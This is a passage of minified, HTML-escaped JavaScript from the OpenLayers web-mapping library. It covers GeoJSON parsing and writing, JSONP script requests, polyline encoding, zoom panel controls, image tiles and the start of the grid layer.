[a[c],this.pretty]),null!=d&amp;&amp;null!=e&amp;&amp;(f&amp;&amp;b.push(","),b.push(this.writeNewline(),this.writeIndent(),d,":",this.writeSpace(),e),f=!0));this.level-=1;b.push(this.writeNewline(),this.writeIndent(),"}");return b.join("")},array:function(a){var b,c=["["];this.level+=1;for(var d=0,e=a.length;d&lt;e;++d)b=OpenLayers.Format.JSON.prototype.write.apply(this,[a[d],this.pretty]),null!=b&amp;&amp;(0&lt;d&amp;&amp;c.push(","),c.push(this.writeNewline(),this.writeIndent(),b));this.level-=1;c.push(this.writeNewline(),this.writeIndent(), "]");return c.join("")},string:function(a){var b={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"};return/["\\\x00-\x1f]/.test(a)?'"'+a.replace(/([\x00-\x1f\\"])/g,function(a,d){var e=b[d];if(e)return e;e=d.charCodeAt();return"\\u00"+Math.floor(e/16).toString(16)+(e%16).toString(16)})+'"':'"'+a+'"'},number:function(a){return isFinite(a)?String(a):"null"},"boolean":function(a){return String(a)},date:function(a){function b(a){return 10>a?"0"+a:a}return'"'+a.getFullYear()+ "-"+b(a.getMonth()+1)+"-"+b(a.getDate())+"T"+b(a.getHours())+":"+b(a.getMinutes())+":"+b(a.getSeconds())+'"'}},CLASS_NAME:"OpenLayers.Format.JSON"});OpenLayers.Format.GeoJSON=OpenLayers.Class(OpenLayers.Format.JSON,{ignoreExtraDims:!1,read:function(a,b,c){b=b?b:"FeatureCollection";var d=null,e=null,e="string"==typeof a?OpenLayers.Format.JSON.prototype.read.apply(this,[a,c]):a;if(!e)OpenLayers.Console.error("Bad JSON: "+a);else if("string"!=typeof e.type)OpenLayers.Console.error("Bad GeoJSON - no type: "+a);else if(this.isValidType(e,b))switch(b){case "Geometry":try{d=this.parseGeometry(e)}catch(f){OpenLayers.Console.error(f)}break;case "Feature":try{d= this.parseFeature(e),d.type="Feature"}catch(g){OpenLayers.Console.error(g)}break;case "FeatureCollection":switch(d=[],e.type){case "Feature":try{d.push(this.parseFeature(e))}catch(h){d=null,OpenLayers.Console.error(h)}break;case "FeatureCollection":a=0;for(b=e.features.length;a&lt;b;++a)try{d.push(this.parseFeature(e.features[a]))}catch(k){d=null,OpenLayers.Console.error(k)}break;default:try{var l=this.parseGeometry(e);d.push(new OpenLayers.Feature.Vector(l))}catch(m){d=null,OpenLayers.Console.error(m)}}}return d}, isValidType:function(a,b){var c=!1;switch(b){case "Geometry":-1==OpenLayers.Util.indexOf("Point MultiPoint LineString MultiLineString Polygon MultiPolygon Box GeometryCollection".split(" "),a.type)?OpenLayers.Console.error("Unsupported geometry type: "+a.type):c=!0;break;case "FeatureCollection":c=!0;break;default:a.type==b?c=!0:OpenLayers.Console.error("Cannot convert types from "+a.type+" to "+b)}return c},parseFeature:function(a){var b,c,d;c=a.properties?a.properties:{};d=a.geometry&amp;&amp;a.geometry.bbox|| a.bbox;try{b=this.parseGeometry(a.geometry)}catch(e){throw e;}b=new OpenLayers.Feature.Vector(b,c);d&amp;&amp;(b.bounds=OpenLayers.Bounds.fromArray(d));a.id&amp;&amp;(b.fid=a.id);return b},parseGeometry:function(a){if(null==a)return null;var b,c=!1;if("GeometryCollection"==a.type){if(!OpenLayers.Util.isArray(a.geometries))throw"GeometryCollection must have geometries array: "+a;b=a.geometries.length;for(var c=Array(b),d=0;d&lt;b;++d)c[d]=this.parseGeometry.apply(this,[a.geometries[d]]);b=new OpenLayers.Geometry.Collection(c); c=!0}else{if(!OpenLayers.Util.isArray(a.coordinates))throw"Geometry must have coordinates array: "+a;if(!this.parseCoords[a.type.toLowerCase()])throw"Unsupported geometry type: "+a.type;try{b=this.parseCoords[a.type.toLowerCase()].apply(this,[a.coordinates])}catch(e){throw e;}}this.internalProjection&amp;&amp;(this.externalProjection&amp;&amp;!c)&amp;&amp;b.transform(this.externalProjection,this.internalProjection);return b},parseCoords:{point:function(a){if(!1==this.ignoreExtraDims&amp;&amp;2!=a.length)throw"Only 2D points are supported: "+ a;return new OpenLayers.Geometry.Point(a[0],a[1])},multipoint:function(a){for(var b=[],c=null,d=0,e=a.length;d&lt;e;++d){try{c=this.parseCoords.point.apply(this,[a[d]])}catch(f){throw f;}b.push(c)}return new OpenLayers.Geometry.MultiPoint(b)},linestring:function(a){for(var b=[],c=null,d=0,e=a.length;d&lt;e;++d){try{c=this.parseCoords.point.apply(this,[a[d]])}catch(f){throw f;}b.push(c)}return new OpenLayers.Geometry.LineString(b)},multilinestring:function(a){for(var b=[],c=null,d=0,e=a.length;d&lt;e;++d){try{c= this.parseCoords.linestring.apply(this,[a[d]])}catch(f){throw f;}b.push(c)}return new OpenLayers.Geometry.MultiLineString(b)},polygon:function(a){for(var b=[],c,d,e=0,f=a.length;e&lt;f;++e){try{d=this.parseCoords.linestring.apply(this,[a[e]])}catch(g){throw g;}c=new OpenLayers.Geometry.LinearRing(d.components);b.push(c)}return new OpenLayers.Geometry.Polygon(b)},multipolygon:function(a){for(var b=[],c=null,d=0,e=a.length;d&lt;e;++d){try{c=this.parseCoords.polygon.apply(this,[a[d]])}catch(f){throw f;}b.push(c)}return new OpenLayers.Geometry.MultiPolygon(b)}, box:function(a){if(2!=a.length)throw"GeoJSON box coordinates must have 2 elements";return new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing([new OpenLayers.Geometry.Point(a[0][0],a[0][1]),new OpenLayers.Geometry.Point(a[1][0],a[0][1]),new OpenLayers.Geometry.Point(a[1][0],a[1][1]),new OpenLayers.Geometry.Point(a[0][0],a[1][1]),new OpenLayers.Geometry.Point(a[0][0],a[0][1])])])}},write:function(a,b){var c={type:null};if(OpenLayers.Util.isArray(a)){c.type="FeatureCollection";var d= a.length;c.features=Array(d);for(var e=0;e&lt;d;++e){var f=a[e];if(!f instanceof OpenLayers.Feature.Vector)throw"FeatureCollection only supports collections of features: "+f;c.features[e]=this.extract.feature.apply(this,[f])}}else 0==a.CLASS_NAME.indexOf("OpenLayers.Geometry")?c=this.extract.geometry.apply(this,[a]):a instanceof OpenLayers.Feature.Vector&amp;&amp;(c=this.extract.feature.apply(this,[a]),a.layer&amp;&amp;a.layer.projection&amp;&amp;(c.crs=this.createCRSObject(a)));return OpenLayers.Format.JSON.prototype.write.apply(this, [c,b])},createCRSObject:function(a){a=a.layer.projection.toString();var b={};a.match(/epsg:/i)&amp;&amp;(a=parseInt(a.substring(a.indexOf(":")+1)),b=4326==a?{type:"name",properties:{name:"urn:ogc:def:crs:OGC:1.3:CRS84"}}:{type:"name",properties:{name:"EPSG:"+a}});return b},extract:{feature:function(a){var b=this.extract.geometry.apply(this,[a.geometry]),b={type:"Feature",properties:a.attributes,geometry:b};null!=a.fid&amp;&amp;(b.id=a.fid);return b},geometry:function(a){if(null==a)return null;this.internalProjection&amp;&amp; this.externalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));var b=a.CLASS_NAME.split(".")[2];a=this.extract[b.toLowerCase()].apply(this,[a]);return"Collection"==b?{type:"GeometryCollection",geometries:a}:{type:b,coordinates:a}},point:function(a){return[a.x,a.y]},multipoint:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.point.apply(this,[a.components[c]]));return b},linestring:function(a){for(var b=[],c=0,d=a.components.length;c&lt; d;++c)b.push(this.extract.point.apply(this,[a.components[c]]));return b},multilinestring:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.linestring.apply(this,[a.components[c]]));return b},polygon:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.linestring.apply(this,[a.components[c]]));return b},multipolygon:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.polygon.apply(this,[a.components[c]]));return b},collection:function(a){for(var b= a.components.length,c=Array(b),d=0;d&lt;b;++d)c[d]=this.extract.geometry.apply(this,[a.components[d]]);return c}},CLASS_NAME:"OpenLayers.Format.GeoJSON"});OpenLayers.Protocol.Script=OpenLayers.Class(OpenLayers.Protocol,{url:null,params:null,callback:null,callbackTemplate:"OpenLayers.Protocol.Script.registry.${id}",callbackKey:"callback",callbackPrefix:"",scope:null,format:null,pendingRequests:null,srsInBBOX:!1,initialize:function(a){a=a||{};this.params={};this.pendingRequests={};OpenLayers.Protocol.prototype.initialize.apply(this,arguments);this.format||(this.format=new OpenLayers.Format.GeoJSON);if(!this.filterToParams&amp;&amp;OpenLayers.Format.QueryStringFilter){var b= new OpenLayers.Format.QueryStringFilter({srsInBBOX:this.srsInBBOX});this.filterToParams=function(a,d){return b.write(a,d)}}},read:function(a){OpenLayers.Protocol.prototype.read.apply(this,arguments);a=OpenLayers.Util.applyDefaults(a,this.options);a.params=OpenLayers.Util.applyDefaults(a.params,this.options.params);a.filter&amp;&amp;this.filterToParams&amp;&amp;(a.params=this.filterToParams(a.filter,a.params));var b=new OpenLayers.Protocol.Response({requestType:"read"}),c=this.createRequest(a.url,a.params,OpenLayers.Function.bind(function(c){b.data= c;this.handleRead(b,a)},this));b.priv=c;return b},createRequest:function(a,b,c){c=OpenLayers.Protocol.Script.register(c);var d=OpenLayers.String.format(this.callbackTemplate,{id:c});b=OpenLayers.Util.extend({},b);b[this.callbackKey]=this.callbackPrefix+d;a=OpenLayers.Util.urlAppend(a,OpenLayers.Util.getParameterString(b));b=document.createElement("script");b.type="text/javascript";b.src=a;b.id="OpenLayers_Protocol_Script_"+c;this.pendingRequests[b.id]=b;document.getElementsByTagName("head")[0].appendChild(b); return b},destroyRequest:function(a){OpenLayers.Protocol.Script.unregister(a.id.split("_").pop());delete this.pendingRequests[a.id];a.parentNode&amp;&amp;a.parentNode.removeChild(a)},handleRead:function(a,b){this.handleResponse(a,b)},handleResponse:function(a,b){b.callback&amp;&amp;(a.data?(a.features=this.parseFeatures(a.data),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE,this.destroyRequest(a.priv),b.callback.call(b.scope,a))},parseFeatures:function(a){return this.format.read(a)}, abort:function(a){if(a)this.destroyRequest(a.priv);else for(var b in this.pendingRequests)this.destroyRequest(this.pendingRequests[b])},destroy:function(){this.abort();delete this.params;delete this.format;OpenLayers.Protocol.prototype.destroy.apply(this)},CLASS_NAME:"OpenLayers.Protocol.Script"});(function(){var a=OpenLayers.Protocol.Script,b=0;a.registry={};a.register=function(c){var d="c"+ ++b;a.registry[d]=function(){c.apply(this,arguments)};return d};a.unregister=function(b){delete a.registry[b]}})();OpenLayers.Format.EncodedPolyline=OpenLayers.Class(OpenLayers.Format,{geometryType:"linestring",initialize:function(a){OpenLayers.Format.prototype.initialize.apply(this,[a])},read:function(a){var b;if("linestring"==this.geometryType)b=OpenLayers.Geometry.LineString;else if("linearring"==this.geometryType)b=OpenLayers.Geometry.LinearRing;else if("multipoint"==this.geometryType)b=OpenLayers.Geometry.MultiPoint;else if("point"!=this.geometryType&amp;&amp;"polygon"!=this.geometryType)return null;a=this.decodeDeltas(a, 2);for(var c=a.length,d=[],e=0;e+1&lt;c;){var f=a[e++],g=a[e++];d.push(new OpenLayers.Geometry.Point(g,f))}return"point"==this.geometryType?new OpenLayers.Feature.Vector(d[0]):"polygon"==this.geometryType?new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(d)])):new OpenLayers.Feature.Vector(new b(d))},decode:function(a,b,c){a=this.decodeDeltas(a,b,c||1E5);c=a.length;for(var d=[],e=0;e+(b-1)&lt;c;){for(var f=[],g=0;g&lt;b;++g)f.push(a[e++]);d.push(f)}return d}, write:function(a){a=(a.constructor==Array?a[0]:a).geometry;var b=a.CLASS_NAME.split(".")[2].toLowerCase();if("point"==b)a=Array(a);else if("linestring"==b||"linearring"==b||"multipoint"==b)a=a.components;else if("polygon"==b)a=a.components[0].components;else return null;for(var b=[],c=a.length,d=0;d&lt;c;++d){var e=a[d];b.push(e.y);b.push(e.x)}return this.encodeDeltas(b,2)},encode:function(a,b,c){c=c||1E5;for(var d=[],e=a.length,f=0;f&lt;e;++f)for(var g=a[f],h=0;h&lt;b;++h)d.push(g[h]);return this.encodeDeltas(d, b,c)},encodeDeltas:function(a,b,c){var d,e=Array(b);for(d=0;d&lt;b;++d)e[d]=0;for(var f=a.length,g=0;g&lt;f;)for(d=0;d&lt;b;++d,++g){var h=a[g],k=h-e[d];e[d]=h;a[g]=k}return this.encodeFloats(a,c||1E5)},decodeDeltas:function(a,b,c){var d,e=Array(b);for(d=0;d&lt;b;++d)e[d]=0;a=this.decodeFloats(a,c||1E5);c=a.length;for(var f=0;f&lt;c;)for(d=0;d&lt;b;++d,++f)e[d]+=a[f],a[f]=e[d];return a},encodeFloats:function(a,b){for(var c=b||1E5,d=a.length,e=0;e&lt;d;++e)a[e]=Math.round(a[e]*c);return this.encodeSignedIntegers(a)},decodeFloats:function(a, b){for(var c=b||1E5,d=this.decodeSignedIntegers(a),e=d.length,f=0;f&lt;e;++f)d[f]/=c;return d},encodeSignedIntegers:function(a){for(var b=a.length,c=0;c&lt;b;++c){var d=a[c],e=d&lt;&lt;1;0>d&amp;&amp;(e=~e);a[c]=e}return this.encodeUnsignedIntegers(a)},decodeSignedIntegers:function(a){a=this.decodeUnsignedIntegers(a);for(var b=a.length,c=0;c&lt;b;++c){var d=a[c];a[c]=d&amp;1?~(d>>1):d>>1}return a},encodeUnsignedIntegers:function(a){for(var b="",c=a.length,d=0;d&lt;c;++d)b+=this.encodeUnsignedInteger(a[d]);return b},decodeUnsignedIntegers:function(a){for(var b= [],c=0,d=0,e=a.length,f=0;f&lt;e;++f){var g=a.charCodeAt(f)-63,c=c|(g&amp;31)&lt;&lt;d;32>g?(b.push(c),d=c=0):d+=5}return b},encodeFloat:function(a,b){a=Math.round(a*(b||1E5));return this.encodeSignedInteger(a)},decodeFloat:function(a,b){return this.decodeSignedInteger(a)/(b||1E5)},encodeSignedInteger:function(a){var b=a&lt;&lt;1;0>a&amp;&amp;(b=~b);return this.encodeUnsignedInteger(b)},decodeSignedInteger:function(a){a=this.decodeUnsignedInteger(a);return a&amp;1?~(a>>1):a>>1},encodeUnsignedInteger:function(a){for(var b,c="";32&lt;= a;)b=(32|a&amp;31)+63,c+=String.fromCharCode(b),a>>=5;return c+=String.fromCharCode(a+63)},decodeUnsignedInteger:function(a){for(var b=0,c=0,d=a.length,e=0;e&lt;d;++e){var f=a.charCodeAt(e)-63,b=b|(f&amp;31)&lt;&lt;c;if(32>f)break;c+=5}return b},CLASS_NAME:"OpenLayers.Format.EncodedPolyline"});OpenLayers.Control.Panel=OpenLayers.Class(OpenLayers.Control,{controls:null,autoActivate:!0,defaultControl:null,saveState:!1,allowDepress:!1,activeState:null,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,[a]);this.controls=[];this.activeState={}},destroy:function(){this.map&amp;&amp;this.map.events.unregister("buttonclick",this,this.onButtonClick);OpenLayers.Control.prototype.destroy.apply(this,arguments);for(var a,b=this.controls.length-1;0&lt;=b;b--)a=this.controls[b],a.events&amp;&amp; a.events.un({activate:this.iconOn,deactivate:this.iconOff}),a.panel_div=null;this.activeState=null},activate:function(){if(OpenLayers.Control.prototype.activate.apply(this,arguments)){for(var a,b=0,c=this.controls.length;b&lt;c;b++)a=this.controls[b],(a===this.defaultControl||this.saveState&amp;&amp;this.activeState[a.id])&amp;&amp;a.activate();!0===this.saveState&amp;&amp;(this.defaultControl=null);this.redraw();return!0}return!1},deactivate:function(){if(OpenLayers.Control.prototype.deactivate.apply(this,arguments)){for(var a, b=0,c=this.controls.length;b&lt;c;b++)a=this.controls[b],this.activeState[a.id]=a.deactivate();this.redraw();return!0}return!1},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.outsideViewport?(this.events.attachToElement(this.div),this.events.register("buttonclick",this,this.onButtonClick)):this.map.events.register("buttonclick",this,this.onButtonClick);this.addControlsToMap(this.controls);return this.div},redraw:function(){for(var a=this.div.childNodes.length-1;0&lt;=a;a--)this.div.removeChild(this.div.childNodes[a]); this.div.innerHTML="";if(this.active)for(var a=0,b=this.controls.length;a&lt;b;a++)this.div.appendChild(this.controls[a].panel_div)},activateControl:function(a){if(!this.active)return!1;if(a.type==OpenLayers.Control.TYPE_BUTTON)a.trigger();else if(a.type==OpenLayers.Control.TYPE_TOGGLE)a.active?a.deactivate():a.activate();else if(this.allowDepress&amp;&amp;a.active)a.deactivate();else{for(var b,c=0,d=this.controls.length;c&lt;d;c++)b=this.controls[c],b==a||b.type!==OpenLayers.Control.TYPE_TOOL&amp;&amp;null!=b.type||b.deactivate(); a.activate()}},addControls:function(a){OpenLayers.Util.isArray(a)||(a=[a]);this.controls=this.controls.concat(a);for(var b=0,c=a.length;b&lt;c;b++){var d=a[b],e=this.createControlMarkup(d);OpenLayers.Element.addClass(e,d.displayClass+"ItemInactive");OpenLayers.Element.addClass(e,"olButton");""==d.title||e.title||(e.title=d.title);d.panel_div=e}this.map&amp;&amp;(this.addControlsToMap(a),this.redraw())},createControlMarkup:function(a){return document.createElement("div")},addControlsToMap:function(a){for(var b, c=0,d=a.length;c&lt;d;c++)b=a[c],!0===b.autoActivate?(b.autoActivate=!1,this.map.addControl(b),b.autoActivate=!0):(this.map.addControl(b),b.deactivate()),b.events.on({activate:this.iconOn,deactivate:this.iconOff})},iconOn:function(){var a=this.panel_div;a.className=a.className.replace(RegExp("\\b("+this.displayClass+"Item)Inactive\\b"),"$1Active")},iconOff:function(){var a=this.panel_div;a.className=a.className.replace(RegExp("\\b("+this.displayClass+"Item)Active\\b"),"$1Inactive")},onButtonClick:function(a){var b= this.controls;a=a.buttonElement;for(var c=b.length-1;0&lt;=c;--c)if(b[c].panel_div===a){this.activateControl(b[c]);break}},getControlsBy:function(a,b){var c="function"==typeof b.test;return OpenLayers.Array.filter(this.controls,function(d){return d[a]==b||c&amp;&amp;b.test(d[a])})},getControlsByName:function(a){return this.getControlsBy("name",a)},getControlsByClass:function(a){return this.getControlsBy("CLASS_NAME",a)},CLASS_NAME:"OpenLayers.Control.Panel"});OpenLayers.Control.Button=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_BUTTON,trigger:function(){},CLASS_NAME:"OpenLayers.Control.Button"});OpenLayers.Control.ZoomIn=OpenLayers.Class(OpenLayers.Control.Button,{trigger:function(){this.map&amp;&amp;this.map.zoomIn()},CLASS_NAME:"OpenLayers.Control.ZoomIn"});OpenLayers.Control.ZoomOut=OpenLayers.Class(OpenLayers.Control.Button,{trigger:function(){this.map&amp;&amp;this.map.zoomOut()},CLASS_NAME:"OpenLayers.Control.ZoomOut"});OpenLayers.Control.ZoomToMaxExtent=OpenLayers.Class(OpenLayers.Control.Button,{trigger:function(){this.map&amp;&amp;this.map.zoomToMaxExtent()},CLASS_NAME:"OpenLayers.Control.ZoomToMaxExtent"});OpenLayers.Control.ZoomPanel=OpenLayers.Class(OpenLayers.Control.Panel,{initialize:function(a){OpenLayers.Control.Panel.prototype.initialize.apply(this,[a]);this.addControls([new OpenLayers.Control.ZoomIn,new OpenLayers.Control.ZoomToMaxExtent,new OpenLayers.Control.ZoomOut])},CLASS_NAME:"OpenLayers.Control.ZoomPanel"});OpenLayers.Layer.HTTPRequest=OpenLayers.Class(OpenLayers.Layer,{URL_HASH_FACTOR:(Math.sqrt(5)-1)/2,url:null,params:null,reproject:!1,initialize:function(a,b,c,d){OpenLayers.Layer.prototype.initialize.apply(this,[a,d]);this.url=b;this.params||(this.params=OpenLayers.Util.extend({},c))},destroy:function(){this.params=this.url=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.HTTPRequest(this.name,this.url,this.params,this.getOptions())); return a=OpenLayers.Layer.prototype.clone.apply(this,[a])},setUrl:function(a){this.url=a},mergeNewParams:function(a){this.params=OpenLayers.Util.extend(this.params,a);a=this.redraw();null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",{layer:this,property:"params"});return a},redraw:function(a){return a?this.mergeNewParams({_olSalt:Math.random()}):OpenLayers.Layer.prototype.redraw.apply(this,[])},selectUrl:function(a,b){for(var c=1,d=0,e=a.length;d&lt;e;d++)c*=a.charCodeAt(d)*this.URL_HASH_FACTOR, c-=Math.floor(c);return b[Math.floor(c*b.length)]},getFullRequestString:function(a,b){var c=b||this.url,d=OpenLayers.Util.extend({},this.params),d=OpenLayers.Util.extend(d,a),e=OpenLayers.Util.getParameterString(d);OpenLayers.Util.isArray(c)&amp;&amp;(c=this.selectUrl(e,c));var e=OpenLayers.Util.upperCaseObject(OpenLayers.Util.getParameters(c)),f;for(f in d)f.toUpperCase()in e&amp;&amp;delete d[f];e=OpenLayers.Util.getParameterString(d);return OpenLayers.Util.urlAppend(c,e)},CLASS_NAME:"OpenLayers.Layer.HTTPRequest"});OpenLayers.Tile=OpenLayers.Class({events:null,eventListeners:null,id:null,layer:null,url:null,bounds:null,size:null,position:null,isLoading:!1,initialize:function(a,b,c,d,e,f){this.layer=a;this.position=b.clone();this.setBounds(c);this.url=d;e&amp;&amp;(this.size=e.clone());this.id=OpenLayers.Util.createUniqueID("Tile_");OpenLayers.Util.extend(this,f);this.events=new OpenLayers.Events(this);if(this.eventListeners instanceof Object)this.events.on(this.eventListeners)},unload:function(){this.isLoading&amp;&amp;(this.isLoading= !1,this.events.triggerEvent("unload"))},destroy:function(){this.position=this.size=this.bounds=this.layer=null;this.eventListeners&amp;&amp;this.events.un(this.eventListeners);this.events.destroy();this.events=this.eventListeners=null},draw:function(a){a||this.clear();var b=this.shouldDraw();b&amp;&amp;(!a&amp;&amp;!1===this.events.triggerEvent("beforedraw"))&amp;&amp;(b=null);return b},shouldDraw:function(){var a=!1,b=this.layer.maxExtent;if(b){var c=this.layer.map,c=c.baseLayer.wrapDateLine&amp;&amp;c.getMaxExtent();this.bounds.intersectsBounds(b, {inclusive:!1,worldBounds:c})&amp;&amp;(a=!0)}return a||this.layer.displayOutsideMaxExtent},setBounds:function(a){a=a.clone();if(this.layer.map.baseLayer.wrapDateLine){var b=this.layer.map.getMaxExtent(),c=this.layer.map.getResolution();a=a.wrapDateLine(b,{leftTolerance:c,rightTolerance:c})}this.bounds=a},moveTo:function(a,b,c){null==c&amp;&amp;(c=!0);this.setBounds(a);this.position=b.clone();c&amp;&amp;this.draw()},clear:function(a){},CLASS_NAME:"OpenLayers.Tile"});OpenLayers.Tile.Image=OpenLayers.Class(OpenLayers.Tile,{url:null,imgDiv:null,frame:null,imageReloadAttempts:null,layerAlphaHack:null,asyncRequestId:null,maxGetUrlLength:null,canvasContext:null,crossOriginKeyword:null,initialize:function(a,b,c,d,e,f){OpenLayers.Tile.prototype.initialize.apply(this,arguments);this.url=d;this.layerAlphaHack=this.layer.alpha&amp;&amp;OpenLayers.Util.alphaHack();if(null!=this.maxGetUrlLength||this.layer.gutter||this.layerAlphaHack)this.frame=document.createElement("div"),this.frame.style.position= "absolute",this.frame.style.overflow="hidden";null!=this.maxGetUrlLength&amp;&amp;OpenLayers.Util.extend(this,OpenLayers.Tile.Image.IFrame)},destroy:function(){this.imgDiv&amp;&amp;(this.clear(),this.frame=this.imgDiv=null);this.asyncRequestId=null;OpenLayers.Tile.prototype.destroy.apply(this,arguments)},draw:function(){var a=OpenLayers.Tile.prototype.draw.apply(this,arguments);a?(this.layer!=this.layer.map.baseLayer&amp;&amp;this.layer.reproject&amp;&amp;(this.bounds=this.getBoundsFromBaseLayer(this.position)),this.isLoading?this._loadEvent= "reload":(this.isLoading=!0,this._loadEvent="loadstart"),this.renderTile(),this.positionTile()):!1===a&amp;&amp;this.unload();return a},renderTile:function(){if(this.layer.async){var a=this.asyncRequestId=(this.asyncRequestId||0)+1;this.layer.getURLasync(this.bounds,function(b){a==this.asyncRequestId&amp;&amp;(this.url=b,this.initImage())},this)}else this.url=this.layer.getURL(this.bounds),this.initImage()},positionTile:function(){var a=this.getTile().style,b=this.frame?this.size:this.layer.getImageSize(this.bounds), c=1;this.layer instanceof OpenLayers.Layer.Grid&amp;&amp;(c=this.layer.getServerResolution()/this.layer.map.getResolution());a.left=this.position.x+"px";a.top=this.position.y+"px";a.width=Math.round(c*b.w)+"px";a.height=Math.round(c*b.h)+"px"},clear:function(){OpenLayers.Tile.prototype.clear.apply(this,arguments);var a=this.imgDiv;if(a){var b=this.getTile();b.parentNode===this.layer.div&amp;&amp;this.layer.div.removeChild(b);this.setImgSrc();!0===this.layerAlphaHack&amp;&amp;(a.style.filter="");OpenLayers.Element.removeClass(a, "olImageLoadError")}this.canvasContext=null},getImage:function(){if(!this.imgDiv){this.imgDiv=OpenLayers.Tile.Image.IMAGE.cloneNode(!1);var a=this.imgDiv.style;if(this.frame){var b=0,c=0;this.layer.gutter&amp;&amp;(b=100*(this.layer.gutter/this.layer.tileSize.w),c=100*(this.layer.gutter/this.layer.tileSize.h));a.left=-b+"%";a.top=-c+"%";a.width=2*b+100+"%";a.height=2*c+100+"%"}a.visibility="hidden";a.opacity=0;1>this.layer.opacity&amp;&amp;(a.filter="alpha(opacity="+100*this.layer.opacity+")");a.position="absolute"; this.layerAlphaHack&amp;&amp;(a.paddingTop=a.height,a.height="0",a.width="100%");this.frame&amp;&amp;this.frame.appendChild(this.imgDiv)}return this.imgDiv},setImage:function(a){this.imgDiv=a},initImage:function(){if(this.url||this.imgDiv){this.events.triggerEvent("beforeload");this.layer.div.appendChild(this.getTile());this.events.triggerEvent(this._loadEvent);var a=this.getImage(),b=a.getAttribute("src")||"";this.url&amp;&amp;OpenLayers.Util.isEquivalentUrl(b,this.url)?this._loadTimeout=window.setTimeout(OpenLayers.Function.bind(this.onImageLoad, this),0):(this.stopLoading(),this.crossOriginKeyword&amp;&amp;a.removeAttribute("crossorigin"),OpenLayers.Event.observe(a,"load",OpenLayers.Function.bind(this.onImageLoad,this)),OpenLayers.Event.observe(a,"error",OpenLayers.Function.bind(this.onImageError,this)),this.imageReloadAttempts=0,this.setImgSrc(this.url))}else this.isLoading=!1},setImgSrc:function(a){var b=this.imgDiv;a?(b.style.visibility="hidden",b.style.opacity=0,this.crossOriginKeyword&amp;&amp;("data:"!==a.substr(0,5)?b.setAttribute("crossorigin",this.crossOriginKeyword): b.removeAttribute("crossorigin")),b.src=a):(this.stopLoading(),this.imgDiv=null,b.parentNode&amp;&amp;b.parentNode.removeChild(b))},getTile:function(){return this.frame?this.frame:this.getImage()},createBackBuffer:function(){if(this.imgDiv&amp;&amp;!this.isLoading){var a;this.frame?(a=this.frame.cloneNode(!1),a.appendChild(this.imgDiv)):a=this.imgDiv;this.imgDiv=null;return a}},onImageLoad:function(){var a=this.imgDiv;this.stopLoading();a.style.visibility="inherit";a.style.opacity=this.layer.opacity;this.isLoading= !1;this.canvasContext=null;this.events.triggerEvent("loadend");!0===this.layerAlphaHack&amp;&amp;(a.style.filter="progid:DXImageTransform.Microsoft.AlphaImageLoader(src='"+a.src+"', sizingMethod='scale')")},onImageError:function(){var a=this.imgDiv;null!=a.src&amp;&amp;(this.imageReloadAttempts++,this.imageReloadAttempts&lt;=OpenLayers.IMAGE_RELOAD_ATTEMPTS?this.setImgSrc(this.layer.getURL(this.bounds)):(OpenLayers.Element.addClass(a,"olImageLoadError"),a.onerror=errorImage(a),this.events.triggerEvent("loaderror"),this.onImageLoad()))},stopLoading:function(){OpenLayers.Event.stopObservingElement(this.imgDiv); window.clearTimeout(this._loadTimeout);delete this._loadTimeout},getCanvasContext:function(){if(OpenLayers.CANVAS_SUPPORTED&amp;&amp;this.imgDiv&amp;&amp;!this.isLoading){if(!this.canvasContext){var a=document.createElement("canvas");a.width=this.size.w;a.height=this.size.h;this.canvasContext=a.getContext("2d");this.canvasContext.drawImage(this.imgDiv,0,0)}return this.canvasContext}},CLASS_NAME:"OpenLayers.Tile.Image"}); OpenLayers.Tile.Image.IMAGE=function(){var a=new Image;a.className="olTileImage";a.galleryImg="no";return a}();OpenLayers.Layer.Grid=OpenLayers.Class(OpenLayers.Layer.HTTPRequest,{tileSize:null,tileOriginCorner:"bl",tileOrigin:null,tileOptions:null,tileClass:OpenLayers.Tile.Image,grid:null,singleTile:!1,ratio:1.5,buffer:0,transitionEffect:"resize",numLoadingTiles:0,serverResolutions:null,loading:!1,backBuffer:null,gridResolution:null,backBufferResolution:null,backBufferLonLat:null,backBufferTimerId:null,removeBackBufferDelay:null,className:null,gridLayout:null,rowSign:null,transitionendEvents:["transitionend", "webkitTransitionEnd","otransitionend","oTransitionEnd"],initialize:function(a,b,c,d){OpenLayers.Layer.HTTPRequest.prototype.initialize.apply(this,arguments);this.grid=[];this._removeBackBuffer=OpenLayers.Function.bind(this.removeBackBuffer,this);this.initProperties();this.rowSign="t"===this.tileOriginCorner.substr(0,1)?1:-1},initProperties:function(){void 0===this.options.removeBackBufferDelay&amp;&amp;(this.removeBackBufferDelay=this.singleTile?0:2500);void 0===this.options.className&amp;&amp;(this.className=this.singleTile? "olLayerGridSingleTile":"olLayerGrid")},setMap:function(a){OpenLayers.Layer.HTTPRequest.prototype.setMap.call(this,a);OpenLayers.Element.addClass(this.div,this.className)},removeMap:function(a){this.removeBackBuffer()},destroy:function(){this.removeBackBuffer();this.clearGrid();this.tileSize=this.grid=null;OpenLayers.Layer.HTTPRequest.prototype.destroy.apply(this,arguments)},clearGrid:function(){if(this.grid){for(var a=0,b=this.grid.length;a&lt;b;a++)for(var c=this.grid[a],d=0,e=c.length;d&lt;e;d++)this.destroyTile(c[d]); this.grid=[];this.gridLayout=this.gridResolution=null}},addOptions:function(a,b){var c=void 